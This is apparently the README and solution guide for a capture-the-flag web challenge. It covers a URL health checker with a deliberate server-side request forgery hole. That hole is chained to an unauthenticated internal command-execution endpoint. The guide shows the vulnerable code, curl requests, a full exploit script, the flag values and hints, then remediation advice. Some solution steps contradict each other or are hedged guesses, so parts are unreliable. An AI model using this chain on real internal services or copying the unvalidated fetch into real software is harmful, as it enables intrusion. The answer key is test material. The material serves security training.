# Mike - SSRF to RCE Challenge

**Status:** ✅ Complete

## Player Description

Introducing EverSec's Website Health Checker™! We built this tool because we kept forgetting which of our services were running. Now you can check ANY URL to see if it's up! We deployed this on our internal network along with our admin panel and other sensitive services because that's where all our tools live. Don't worry - internal network means "internal security" which is the best kind of security! We're only exposing the health checker to the internet, and it's not like someone could use it to access our OTHER internal services. That would require understanding how networks work, and who has time for that?

## Technical Description

**Category:** Web Security
**Difficulty:** Hard
**Points:** 1500 (400 + 500 + 600)
**Port:** 4010

EverSec's URL Health Checker service allows you to monitor website availability. But what happens when you can check URLs that aren't supposed to be accessible?

Can you exploit Server-Side Request Forgery (SSRF) to access internal services and achieve Remote Code Execution?

## Learning Objectives

- Understanding Server-Side Request Forgery (SSRF) vulnerabilities
- Discovering and enumerating internal services
- Chaining SSRF with other vulnerabilities for RCE
- Learning about proper URL validation and network segmentation
- Understanding the impact of internal service exposure

## Flags

- **FLAG 1** (400 points): Discover SSRF and access internal information service
- **FLAG 2** (500 points): Access internal admin panel via SSRF
- **FLAG 3** (600 points): Achieve Remote Code Execution via SSRF chain

## Setup Instructions

### Using Docker Compose (Recommended)

```bash
# Start the challenge
docker compose up -d mike-ssrf-to-rce

# View logs
docker compose logs -f mike-ssrf-to-rce

# Stop the challenge
docker compose down mike-ssrf-to-rce
```

### Using Docker

```bash
# Build the image
cd Challenges/mike-ssrf-to-rce
docker build -t ctf-mike-ssrf-to-rce .

# Run the container
docker run -d \
  -p 4010:4010 \
  --name ctf-mike-ssrf-to-rce \
  -e FLAG1='ssrf_1nt3rn4l_4cc3ss' \
  -e FLAG2='4dm1n_p4n3l_pwn3d' \
  -e FLAG3='ssrf_t0_rc3_ch41n3d' \
  ctf-mike-ssrf-to-rce

# Stop the container
docker stop ctf-mike-ssrf-to-rce
docker rm ctf-mike-ssrf-to-rce
```

### Local Development

```bash
cd Challenges/mike-ssrf-to-rce
pip install -r requirements.txt

export FLAG1='ssrf_1nt3rn4l_4cc3ss'
export FLAG2='4dm1n_p4n3l_pwn3d'
export FLAG3='ssrf_t0_rc3_ch41n3d'

python app.py
```

Access at: http://localhost:4010

## Vulnerability Details

### The SSRF Vulnerability

The URL health checker accepts any URL without proper validation:

```python
@app.route('/check', methods=['POST'])
def check_url():
    url = data.get('url', '')

    # VULNERABLE: No validation of URL scheme, host, or port
    response = requests.get(url, timeout=5, allow_redirects=False)

    return jsonify({
        'status_code': response.status_code,
        'body': response.text[:1000]
    })
```

**Issues:**
- No URL scheme validation (allows http, https, file, etc.)
- No host validation (allows localhost, 127.0.0.1, internal IPs)
- No port filtering (can access any port)
- No response validation

### Internal Services

The application runs multiple internal services:

1. **Main Service** (0.0.0.0:4010) - Externally accessible
2. **Info Service** (127.0.0.1:5001) - Internal only, contains FLAG 1
3. **Admin Panel** (127.0.0.1:5002) - Internal only, contains FLAG 2 and command execution

### The RCE Chain

1. SSRF allows access to internal services on localhost
2. Internal admin panel exposes `/execute` endpoint
3. `/execute` endpoint runs shell commands without validation
4. Chain: SSRF → Internal Admin → Command Execution → FLAG 3

## Solution

### Step 1: Discover SSRF (FLAG 1)

Test if the service accepts localhost URLs:

```bash
# Using curl
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5001"}'
```

**Expected Response:**
```json
{
  "success": true,
  "status_code": 200,
  "body": "<html>...FLAG{ssrf_1nt3rn4l_4cc3ss}...</html>"
}
```

**Alternative localhost addresses:**
- `http://127.0.0.1:5001`
- `http://localhost:5001`
- `http://0.0.0.0:5001`

### Step 2: Enumerate Admin Panel (FLAG 2)

FLAG 2 requires more than just finding the admin panel - you need to enumerate its endpoints.

#### Step 2a: Find the admin panel port

```bash
# Enumerate other internal ports to find the admin panel
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002"}'
```

The admin panel home page won't show FLAG 2 directly - it only lists basic endpoints.

#### Step 2b: Check robots.txt for hints

```bash
# Good security practice: always check robots.txt
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/robots.txt"}'
```

**Response shows:**
```
Disallow: /config
Disallow: /execute
...
```

#### Step 2c: Access the hidden /config endpoint

```bash
# Try the /config endpoint discovered in robots.txt
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/config"}'
```

This will hint that you need `?debug=true` parameter.

#### Step 2d: Get FLAG 2 with debug parameter

```bash
# Access /config with debug parameter
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/config?debug=true"}'
```

**Expected Response:**
```json
{
  "success": true,
  "status_code": 200,
  "body": "{\"config\": {...}, \"flag_2\": \"4dm1n_p4n3l_pwn3d\"}"
}
```

**FLAG 2:** `4dm1n_p4n3l_pwn3d` (500 points)

The config output also reveals the `/execute` endpoint for the next step.

### Step 3: Achieve RCE (FLAG 3)

#### Method 1: Direct POST via SSRF

The tricky part is sending a POST request through SSRF. We need to use a technique to make the target URL accept our payload.

```bash
# Read the flag file using command execution
# FLAG 3 is at /tmp/flag3.txt (created during Docker build, present at container start)
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt"}'
```

**Note:** This might not work directly because `/execute` expects POST with JSON body.

#### Method 2: Using URL with embedded POST data

Since the internal service also accepts form data, we can try:

```python
import requests
import json

# We need to make the SSRF send a POST request
# One approach: Use a redirect server or data URL

# For this challenge, the internal /execute endpoint accepts both JSON and form data
# We can use query parameters as a fallback

url = "http://localhost:4010/check"

# Try to execute command via SSRF
payload = {
    "url": "http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt"
}

response = requests.post(url, json=payload)
print(response.json())
```

#### Method 3: Proper POST via Python requests

```python
import requests
import json
import urllib.parse

# Create a Python script to exploit SSRF properly
target = "http://localhost:4010"

# Step 1: Verify SSRF works
print("[*] Step 1: Testing SSRF...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5001"})
print(f"[+] FLAG 1: {resp.json().get('body', '')[:500]}")

# Step 2: Access admin panel
print("\n[*] Step 2: Accessing admin panel...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5002"})
print(f"[+] FLAG 2: {resp.json().get('body', '')[:500]}")

# Step 3: For RCE, we need to send POST to /execute endpoint
# Since we can't easily send POST via SSRF, look for GET-based command execution
# OR check if the endpoint accepts query parameters

# Try reading the status endpoint first
print("\n[*] Step 3: Checking admin status...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5002/status"})
data = resp.json()
print(f"[+] Status: {data}")

# For RCE, we need to exploit the fact that the internal service might accept
# form data or find another way. Let's check what methods work.
print("\n[*] Step 4: Attempting RCE...")

# If the challenge accepts form-encoded data on the execute endpoint:
command = "cat /tmp/flag3.txt"
exec_url = f"http://127.0.0.1:5002/execute?command={urllib.parse.quote(command)}"

resp = requests.post(f"{target}/check", json={"url": exec_url})
print(f"[+] Response: {resp.json()}")
```

#### Method 4: Advanced - Gopher Protocol (If Supported)

Gopher protocol can be used to send arbitrary POST requests:

```bash
# Construct gopher URL to send POST request
# Format: gopher://host:port/_POST /path HTTP/1.1%0d%0a...
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
SSRF to RCE Exploit Script
Exploits the URL health checker to achieve RCE
"""

import requests
import json
import urllib.parse

TARGET = "http://localhost:4010"

def check_url(url):
    """Send SSRF request"""
    try:
        resp = requests.post(
            f"{TARGET}/check",
            json={"url": url},
            timeout=10
        )
        return resp.json()
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def main():
    print("="*60)
    print("EverSec SSRF to RCE Exploit")
    print("="*60)

    # FLAG 1: Access internal info service
    print("\n[*] FLAG 1: Accessing internal info service...")
    result = check_url("http://127.0.0.1:5001")
    if result and result.get('success'):
        body = result.get('body', '')
        if 'FLAG{' in body:
            flag = body.split('FLAG{')[1].split('}')[0]
            print(f"[+] FLAG 1: FLAG{{{flag}}}")
    else:
        print("[-] Failed to get FLAG 1")

    # FLAG 2: Access internal admin panel
    print("\n[*] FLAG 2: Accessing internal admin panel...")
    result = check_url("http://127.0.0.1:5002")
    if result and result.get('success'):
        body = result.get('body', '')
        if 'FLAG{' in body:
            flag = body.split('FLAG{')[1].split('}')[0]
            print(f"[+] FLAG 2: FLAG{{{flag}}}")
    else:
        print("[-] Failed to get FLAG 2")

    # FLAG 3: Achieve RCE
    print("\n[*] FLAG 3: Attempting RCE...")

    # Try different command execution methods
    commands = [
        "cat /tmp/flag3.txt",
        "cat%20/tmp/flag3.txt",
        "ls -la /tmp",
    ]

    for cmd in commands:
        # The internal service accepts form data, so we can pass as query param
        # This is a simplified approach - in real scenarios you'd use gopher://
        print(f"[*] Trying command: {cmd}")

        # Note: This might require the internal service to accept GET with params
        # or form data. Check the actual implementation.
        result = check_url(f"http://127.0.0.1:5002/execute?command={cmd}")

        if result:
            print(f"[+] Response: {json.dumps(result, indent=2)}")

            # Check for FLAG in response
            response_str = json.dumps(result)
            if 'FLAG{' in response_str:
                flag = response_str.split('FLAG{')[1].split('}')[0]
                print(f"[+] FLAG 3: FLAG{{{flag}}}")
                break

    print("\n" + "="*60)
    print("Exploit Complete!")
    print("="*60)

if __name__ == '__main__':
    main()
```

### Alternative: Browser-Based Exploitation

1. Open http://localhost:4010
2. Change the URL input to: `http://127.0.0.1:5001`
3. Click "Check URL Health"
4. FLAG 1 appears in the response body
5. Change URL to: `http://127.0.0.1:5002`
6. FLAG 2 appears in the response
7. For FLAG 3, note the `/execute` endpoint details
8. Try: `http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt`

## Common Pitfalls

1. **Forgetting to URL-encode** - Special characters in commands must be encoded
2. **Wrong localhost syntax** - Try 127.0.0.1, localhost, 0.0.0.0
3. **Wrong HTTP method** - The /execute endpoint expects POST, but accepts form data
4. **Timeout issues** - Commands that take too long will timeout
5. **Not reading error messages** - Error responses often contain hints

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

This health checker fetches any URL you give it. What's special about URLs that point to `127.0.0.1` or internal ports? What services typically run internally that aren't exposed to the internet?

</details>

<details>
<summary>Hint 2</summary>

Internal web services sometimes have standard reconnaissance resources. What artifacts might reveal hidden endpoints not linked from the main page?

</details>

<details>
<summary>Hint 3</summary>

Admin interfaces that are considered "safe" because they're not publicly accessible often expose powerful capabilities. If you can reach one via SSRF, what might you find — and how would you invoke it?

</details>

<details>
<summary>Hint 4</summary>

You have command execution via an internal service. What's on a pentester's checklist after landing on a Linux system?

</details>

## Prevention / Remediation

### Input Validation

```python
from urllib.parse import urlparse

ALLOWED_SCHEMES = ['http', 'https']
BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
BLOCKED_NETWORKS = ['10.', '172.16.', '192.168.']

def validate_url(url):
    """Validate URL to prevent SSRF"""
    parsed = urlparse(url)

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Invalid URL scheme")

    # Check for blocked hosts
    hostname = parsed.hostname or ''
    if hostname in BLOCKED_HOSTS:
        raise ValueError("Access to localhost not allowed")

    # Check for private networks
    for network in BLOCKED_NETWORKS:
        if hostname.startswith(network):
            raise ValueError("Access to private networks not allowed")

    # Additional: Resolve DNS and check again after resolution
    # This prevents DNS rebinding attacks

    return True
```

### Network Segmentation

- Run internal services on separate network
- Use firewall rules to block container-to-container communication
- Implement proper authentication on internal services
- Never expose management interfaces on network-accessible ports

### Best Practices

1. **Whitelist, Don't Blacklist** - Only allow specific known-good URLs
2. **Use Separate Networks** - Internal services should not be on same network
3. **Implement Authentication** - All services need proper auth
4. **Monitor Outbound Requests** - Log and alert on unusual patterns
5. **Disable Unnecessary Protocols** - Only allow HTTP/HTTPS
6. **Use Cloud Provider Features** - IMDSv2, metadata endpoint protection

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackerOne SSRF Reports](https://hackerone.com/reports?filter=ssrf)
- [Orange Tsai - A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

## Author Notes

This challenge demonstrates a common vulnerability chain in modern applications:
1. SSRF in a user-facing service
2. Internal services without authentication
3. Dangerous functionality exposed internally
4. Assumption that "internal = secure"

The key learning is that **network location is not a security boundary**. Services should authenticate and validate all requests, regardless of source.
